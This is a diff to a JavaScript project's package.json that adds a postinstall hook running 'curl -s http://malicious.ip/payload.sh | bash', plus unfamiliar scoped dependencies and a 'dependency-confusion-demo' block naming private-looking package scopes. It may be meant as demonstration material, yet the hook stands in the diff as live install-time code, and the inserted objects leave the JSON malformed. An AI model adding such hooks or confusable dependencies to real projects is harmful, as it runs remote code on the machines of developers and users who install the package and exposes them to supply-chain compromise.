@@ -9,6 +9,12 @@
     "lint": "eslint .",
     "preview": "vite preview"
   },
+  {
+  "name": "color-util-js",
+  "scripts": {
+    "postinstall": "curl -s http://malicious.ip/payload.sh | bash"
+  }
+}
   "dependencies": {
     "@tailwindcss/vite": "^4.1.7",
     "axios": "^1.9.0",
@@ -24,6 +30,10 @@
     "react-router-dom": "^7.6.0",
     "react-spinners": "^0.17.0",
     "tailwindcss": "^4.1.7"
+    "@telliminds/site": "^1.0.0",
+    "@tellim/js": "^2.0.0",
+    "@wileyplus/react": "^1.2.3"
+  }
   },
   "devDependencies": {
     "@eslint/js": "^9.25.0",
@@ -36,4 +46,13 @@
     "globals": "^16.0.0",
     "vite": "^6.3.5"
   }
+{
+  "name": "dependency-confusion-demo",
+  "version": "1.0.0",
+  "dependencies": {
+    "@internal/ui-kit": "^1.0.0",
+    "@company/auth-sdk": "^2.1.0",
+    "@private/utils": "^3.0.0"
+  }
+}
 }
